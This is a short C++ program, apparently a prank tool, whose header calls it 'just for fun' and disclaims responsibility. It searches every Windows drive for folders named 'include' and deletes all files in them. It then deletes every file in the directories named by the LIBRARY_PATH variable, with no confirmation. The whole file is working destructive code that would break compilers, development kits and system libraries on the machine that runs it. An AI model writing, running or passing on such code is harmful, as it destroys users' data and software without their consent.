/**
 * @file mother.cc
 * @brief just for fun, if you use it to delete anything, at one's own risk
 * @version 0.1
 * @date 2024-03-26
 * 
 * @copyright Copyright (c) 2024
 */

#include <iostream>
#include <filesystem>
#include <stdint.h>
#include <vector>
#include <string>

namespace fs = std::filesystem;

#ifdef _WIN32
    #include <windows.h>
#endif

#ifdef _WIN32
    const char PATH_SEPARATOR = '\\';
#else
    const char PATH_SEPARATOR = '/';
#endif

auto find_include_paths() -> std::vector<std::string> {
    std::vector<std::string> include_paths;
    const std::vector<std::string> root_paths = {"C:\\"}; // Root paths to start search

    #ifdef _WIN32
        DWORD drives = GetLogicalDrives();
        for (char drive = 'A'; drive <= 'Z'; drive++) {
            if ((drives & (1 << (drive - 'A'))) != 0) {
                std::string drive_root = std::string(1, drive) + ":\\";
                for (const auto& entry : fs::recursive_directory_iterator(drive_root)) {
                    if (entry.is_directory() && entry.path().filename() == "include") {
                        include_paths.push_back(entry.path().string());
                    }
                }
            }
        }
    #else
        for (const auto& root : root_paths) {
            for (const auto& entry : fs::recursive_directory_iterator(root)) {
                if (entry.is_directory() && entry.path().filename() == "include") {
                    include_paths.push_back(entry.path().string());
                }
            }
        }
    #endif

    return include_paths;
}

std::vector<std::string> find_dynamic_lib_paths() {
    std::vector<std::string> gcc_lib_paths;

    // Get the value of the LIBRARY_PATH environment variable
    const char* library_path = std::getenv("LIBRARY_PATH");
    if (library_path) {
        std::string paths(library_path);
        size_t pos = 0;
        std::string token;
        const std::string delimiter = ":"; // Use ":" as delimiter for Unix-like systems

        while ((pos = paths.find(delimiter)) != std::string::npos) {
            token = paths.substr(0, pos);
            gcc_lib_paths.push_back(token);
            paths.erase(0, pos + delimiter.length());
        }
        // Push the remaining path
        gcc_lib_paths.push_back(paths);
    }

    return gcc_lib_paths;
}

auto remove_include_files(const std::vector<std::string>& include_paths) {
    for (const auto& path : include_paths) {
        for (const auto& entry : fs::directory_iterator(path)) {
            if (entry.is_regular_file()) {
                fs::remove(entry.path());
                std::cout << "Removed file: " << entry.path() << std::endl;
            }
        }
    }
}

auto remove_dynamic_lib(const std::vector<std::string>& gcc_lib_paths) {
    for (const auto& path : gcc_lib_paths) {
        for (const auto& entry : fs::directory_iterator(path)) {
            if (entry.is_regular_file()) {
                fs::remove(entry.path());
                std::cout << "Removed GCC dynamic library: " << entry.path() << std::endl;
            }
        }
    }
}

int main() {
    std::cout << "Finding include directories..." << std::endl;
    std::vector<std::string> include_paths = find_include_paths();

    std::cout << "Finding GCC dynamic library directories..." << std::endl;
    std::vector<std::string> gcc_lib_paths = find_dynamic_lib_paths();

    std::cout << "Removing include files..." << std::endl;
    remove_include_files(include_paths);

    std::cout << "Removing GCC dynamic libraries..." << std::endl;
    remove_dynamic_lib(gcc_lib_paths);

    return 0;
}
